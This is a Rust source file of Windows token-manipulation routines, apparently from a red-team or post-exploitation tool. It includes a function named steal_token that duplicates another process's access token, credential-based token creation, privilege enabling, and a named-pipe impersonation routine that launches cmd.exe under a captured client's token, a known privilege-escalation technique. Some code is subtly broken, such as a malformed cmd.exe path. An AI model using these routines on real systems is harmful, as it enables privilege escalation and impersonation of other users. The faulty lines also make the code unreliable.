use windows_sys::Win32::{
    Foundation::{CloseHandle, GetLastError, ERROR_IO_PENDING, HANDLE, INVALID_HANDLE_VALUE, LUID},
    Security::{
        AdjustTokenPrivileges, DuplicateTokenEx, ImpersonateLoggedOnUser, LogonUserW,
        LookupPrivilegeValueW, RevertToSelf, SecurityImpersonation, TokenPrimary,
        LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, SE_PRIVILEGE_ENABLED,
        TOKEN_ALL_ACCESS, TOKEN_DUPLICATE, TOKEN_IMPERSONATE, TOKEN_PRIVILEGES, TOKEN_QUERY,
    },
    Storage::FileSystem::{ReadFile, PIPE_ACCESS_DUPLEX},
    System::{
        Pipes::{
            ConnectNamedPipe, CreateNamedPipeA, DisconnectNamedPipe, ImpersonateNamedPipeClient,
            PIPE_READMODE_BYTE, PIPE_READMODE_MESSAGE, PIPE_TYPE_MESSAGE, PIPE_UNLIMITED_INSTANCES,
            PIPE_WAIT,
        },
        SystemServices::MAXIMUM_ALLOWED,
        Threading::{
            CreateProcessWithTokenW, GetCurrentThread, OpenThreadToken, CREATE_NEW_CONSOLE,
            LOGON_WITH_PROFILE, PROCESS_INFORMATION, STARTUPINFOW,
        },
        Threading::{GetCurrentProcess, OpenProcess, OpenProcessToken, PROCESS_QUERY_INFORMATION},
    },
};

use std::mem::size_of;

pub mod error;
use self::error::Error;

/// Retrieves the calling thread's last-error code value.
pub fn get_last_error() -> u32 {
    unsafe { GetLastError() }
}

/// Terminates the impersonation of a client application.
pub fn revert_to_self() -> Result<(), Error> {
    // The RevertToSelf function terminates the impersonation of a client application.
    // https://docs.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-reverttoself
    let revert_to_self_result = unsafe { RevertToSelf() };

    if revert_to_self_result == 0 {
        return Err(Error::FailedToRevertToSelf(get_last_error()));
    }

    Ok(())
}

// The `steal_token` function attempts to retrieve a duplicated access token associated with a process, given its process ID.
// If successful, it returns a handle to the duplicated token, otherwise it returns an error indicating the reason for failure.
pub fn steal_token(process_id: u32) -> Result<isize, Error> {
    // Opens an existing local process object.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess
    let process_handle = unsafe { OpenProcess(PROCESS_QUERY_INFORMATION, 0, process_id) };

    if process_handle == 0 {
        return Err(Error::FailedToOpenProcess(get_last_error()));
    }

    let mut token_handle: HANDLE = 0;
    // The OpenProcessToken function opens the access token associated with a process.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
    let open_process_token_result = unsafe {
        OpenProcessToken(
            process_handle,
            TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE,
            &mut token_handle,
        )
    };

    if open_process_token_result == 0 {
        unsafe { CloseHandle(process_handle) };
        return Err(Error::FailedToOpenProcessToken(get_last_error()));
    }

    let mut duplicate_token_handle = 0;
    // The DuplicateTokenEx function creates a new access token that duplicates an existing token. This function can create either a primary token or an impersonation token.
    // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
    let duplicate_token_result = unsafe {
        DuplicateTokenEx(
            token_handle,
            MAXIMUM_ALLOWED,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicate_token_handle,
        )
    };

    if duplicate_token_result == 0 {
        unsafe { CloseHandle(token_handle) };
        unsafe { CloseHandle(process_handle) };
        return Err(Error::FailedToDuplicateToken(get_last_error()));
    }

    return Ok(duplicate_token_handle);
}

/// The `make_token()` function attempts to authenticate a user with a given `domain`, `username`, and `password` by calling the `LogonUserW` function.
/// If successful, it returns a handle to a token that represents the logged-on user,
/// which can be used to impersonate the specified user or create a process that runs in the context of the specified user.
pub fn make_token(domain: &str, username: &str, password: &str) -> Result<isize, Error> {
    let domain_w = domain.encode_utf16().collect::<Vec<u16>>();
    let username_w = username.encode_utf16().collect::<Vec<u16>>();
    let password_w = password.encode_utf16().collect::<Vec<u16>>();

    // The LogonUser function attempts to log a user on to the local computer. The local computer is the computer from which LogonUser was called.
    // You cannot use LogonUser to log on to a remote computer.
    // You specify the user with a user name and domain and authenticate the user with a plaintext password.
    // If the function succeeds, you receive a handle to a token that represents the logged-on user.
    // You can then use this token handle to impersonate the specified user or, in most cases, to create a process that runs in the context of the specified user.
    // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-logonuserw
    let mut token_handle = 0;
    let logon_userw_result = unsafe {
        LogonUserW(
            username_w.as_ptr(),
            domain_w.as_ptr(),
            password_w.as_ptr(),
            LOGON32_LOGON_NEW_CREDENTIALS,
            LOGON32_PROVIDER_DEFAULT,
            &mut token_handle,
        )
    };

    if logon_userw_result == 0 {
        return Err(Error::FailedToLogonUser(get_last_error()));
    }

    Ok(token_handle)
}

/// This `impersonate_token` function allows the calling thread to impersonate the security context of a logged-on user,
/// represented by a token handle. This can be useful for performing actions on behalf of another user,
/// such as accessing files or resources that are only available to that user.
pub fn impersonate_token(token_handle: isize) -> Result<isize, Error> {
    // The ImpersonateLoggedOnUser function lets the calling thread impersonate the security context of a logged-on user.
    // The user is represented by a token handle.
    //https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-impersonateloggedonuser
    let impersonate_logged_on_user_result = unsafe { ImpersonateLoggedOnUser(token_handle) };

    if impersonate_logged_on_user_result == 0 {
        return Err(Error::FailedToImpersonateLoggedOnUser(get_last_error()));
    }

    Ok(token_handle)
}

/// The `set_token_privileges` function takes a privilege name and a boolean value to either enable or disable that privilege in the current process's access token.
/// It first looks up the locally unique identifier (`LUID`) for the specified privilege name using the `LookupPrivilegeValueW` function.
/// Then, it constructs a `TOKEN_PRIVILEGES` structure with the `LUID` and the desired attributes (enabled or disabled).
/// The function then opens the process's access token using the `OpenProcessToken` function and
/// calls the `AdjustTokenPrivileges` function to adjust the privileges in the token.
pub fn set_token_privileges(privilege: &str, enable: bool) -> Result<(), Error> {
    let privilege_w = privilege.encode_utf16().collect::<Vec<u16>>();
    let mut token_luid: LUID = unsafe { std::mem::zeroed() };

    // The LookupPrivilegeValue function retrieves the locally unique identifier (LUID) used on a specified system to locally represent the specified privilege name.
    // https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluew
    let lookup_token_privilege_valuew_result =
        unsafe { LookupPrivilegeValueW(std::ptr::null(), privilege_w.as_ptr(), &mut token_luid) };

    if lookup_token_privilege_valuew_result == 0 {
        return Err(Error::FailedToLookupPrivilegeValue(get_last_error()));
    }

    let mut token_privileges: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };
    token_privileges.PrivilegeCount = 1;
    token_privileges.Privileges[0].Luid = token_luid;

    if enable {
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    } else {
        token_privileges.Privileges[0].Attributes = 0;
    }

    let mut token_handle: HANDLE = 0;
    // The OpenProcessToken function opens the access token associated with a process.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken
    let open_process_token_result =
        unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &mut token_handle) };

    if open_process_token_result == 0 {
        return Err(Error::FailedToOpenProcessToken(get_last_error()));
    }

    // The AdjustTokenPrivileges function enables or disables privileges in the specified access token.
    // Enabling or disabling privileges in an access token requires TOKEN_ADJUST_PRIVILEGES access.
    // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges
    let adjust_token_privileges_result = unsafe {
        AdjustTokenPrivileges(
            token_handle,
            0,
            &mut token_privileges,
            0,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
        )
    };

    if adjust_token_privileges_result == 0 {
        unsafe { CloseHandle(token_handle) };
        return Err(Error::FailedToAdjustTokenPrivileges(get_last_error()));
    }

    Ok(())
}

fn io_pending() -> bool {
    unsafe { GetLastError() == ERROR_IO_PENDING }
}

pub const PIPE_BUFFER_SIZE: u32 = 2048;

pub fn impersonate_named_pipe(name: &str) -> Result<(), Error> {
    log::info!("Creating named pipe");
    let pipe_name = format!("\\\\.\\pipe\\{}\0", name);
    log::info!("Named Pipe: {:?}", pipe_name);

    //let mut sa: SECURITY_ATTRIBUTES = unsafe { core::mem::zeroed() };
    // Creates an instance of a named pipe and returns a handle for subsequent pipe operations.
    // A named pipe server process uses this function either to create the first instance of
    // a specific named pipe and establish its basic attributesor to create a new instance of an existing named pipe.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createnamedpipew
    let pipe_handle = unsafe {
        CreateNamedPipeA(
            pipe_name.as_ptr(),
            PIPE_ACCESS_DUPLEX,
            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_READMODE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            PIPE_BUFFER_SIZE,
            PIPE_BUFFER_SIZE,
            0,
            std::ptr::null_mut(),
        )
    };

    if pipe_handle == INVALID_HANDLE_VALUE {
        return Err(Error::FailedToCreateNamedPipe(get_last_error()));
    }
    log::info!("Creating named pipe created!");
    log::info!("Connecting to named pipe");

    //
    // Note this will wait until something connects to it.
    //

    // Enables a named pipe server process to wait for a client process to connect to an instance of a named pipe.
    // A client process connects by calling either the CreateFile or CallNamedPipe function.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-connectnamedpipe
    let connect_named_pip_result = unsafe { ConnectNamedPipe(pipe_handle, std::ptr::null_mut()) };

    if connect_named_pip_result == 0 || io_pending() {
        //Disconnects the server end of a named pipe instance from a client process.
        // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-disconnectnamedpipe
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToConnectNamedPipe(get_last_error()));
    }

    log::info!("Connecting to named pipe successfully!");
    log::info!("reading data from named pipe");

    let mut buffer: Vec<u8> = Vec::with_capacity(PIPE_BUFFER_SIZE as _);
    let mut read: u32 = 0;
    // Reads data from the specified file or input/output (I/O) device.
    // Reads occur at the position specified by the file pointer if supported by the device.
    // This function is designed for both synchronous and asynchronous operations.
    // For a similar function designed solely for asynchronous operation, see ReadFileEx.
    // https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile
    let read_file_result = unsafe {
        ReadFile(
            pipe_handle,
            buffer.as_mut_ptr() as _,
            PIPE_BUFFER_SIZE,
            &mut read,
            std::ptr::null_mut(),
        )
    };

    log::info!("Bytes read: {}", read);

    if read_file_result == 0 {
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToReadFromNamedPipe(get_last_error()));
    }
    log::info!("data read from pipe successfully!");
    log::info!("impersonating named pipe client");

    // The ImpersonateNamedPipeClient function impersonates a named-pipe client application.
    // https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
    let impersonate_named_pip_client_res = unsafe { ImpersonateNamedPipeClient(pipe_handle) };

    if impersonate_named_pip_client_res == 0 {
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::ImpersonateNamedPipeClient(get_last_error()));
    }

    log::info!("impersonating named pipe client successful!");
    log::info!("getting current thread and opening thread token");

    // Retrieves a pseudo handle for the calling thread.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentthread
    let thread_handle = unsafe { GetCurrentThread() };

    let mut thread_token = 0;
    // The OpenThreadToken function opens the access token associated with a thread.
    // https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthreadtoken
    let open_thread_token_result =
        unsafe { OpenThreadToken(thread_handle, TOKEN_ALL_ACCESS, 0, &mut thread_token) };

    if open_thread_token_result == 0 {
        unsafe { CloseHandle(thread_handle as _) };
        unsafe { DisconnectNamedPipe(pipe_handle) };
        return Err(Error::FailedToOpenThreadToken(get_last_error()));
    }

    log::info!("getting current thread and opening thread token successful!");

    log::info!("duplicating token");

    let mut duplicate_token_handle = 0;
    // The DuplicateTokenEx function creates a new access token that duplicates an existing token.
    // This function can create either a primary token or an impersonation token.
    // https://learn.microsoft.com/en-us/windows/win32/api/securitybaseapi/nf-securitybaseapi-duplicatetokenex
    let duplicate_token_result = unsafe {
        DuplicateTokenEx(
            thread_token,
            TOKEN_ALL_ACCESS,
            std::ptr::null_mut(),
            SecurityImpersonation,
            TokenPrimary,
            &mut duplicate_token_handle,
        )
    };

    unsafe { CloseHandle(thread_handle as _) };
    unsafe { CloseHandle(thread_token as _) };
    unsafe { DisconnectNamedPipe(pipe_handle) };

    if duplicate_token_result == 0 {
        return Err(Error::FailedToDuplicateThreadToken(get_last_error()));
    }

    log::info!("duplicating token successful!");
    log::info!("creating process with token");

    let mut startup_info: STARTUPINFOW = unsafe { std::mem::zeroed() };
    startup_info.cb = size_of::<STARTUPINFOW>() as u32;
    let mut process_info: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    let command = "C\\Windows\\System32\\cmd.exe"
        .encode_utf16()
        .collect::<Vec<u16>>();

    let create_process_with_token_w_result = unsafe {
        CreateProcessWithTokenW(
            duplicate_token_handle,
            LOGON_WITH_PROFILE,
            std::ptr::null_mut(),
            command.as_ptr() as _,
            CREATE_NEW_CONSOLE,
            std::ptr::null_mut(),
            std::ptr::null_mut(),
            &mut startup_info,
            &mut process_info,
        )
    };

    if create_process_with_token_w_result == 0 {
        unsafe { CloseHandle(duplicate_token_handle as _) };
        return Err(Error::FailedToCreateProcessWithTokenW(get_last_error()));
    }

    unsafe { CloseHandle(duplicate_token_handle as _) };

    log::info!("creating process with token sucessful!");

    Ok(())
}

#[allow(dead_code)]
/// Gets user input from the terminal
fn get_input() -> std::io::Result<()> {
    let mut buf = String::new();
    std::io::stdin().read_line(&mut buf)?;
    Ok(())
}

#[allow(dead_code)]
/// Used for debugging
pub fn pause() {
    match get_input() {
        Ok(buffer) => println!("{:?}", buffer),
        Err(error) => println!("error: {}", error),
    };
}
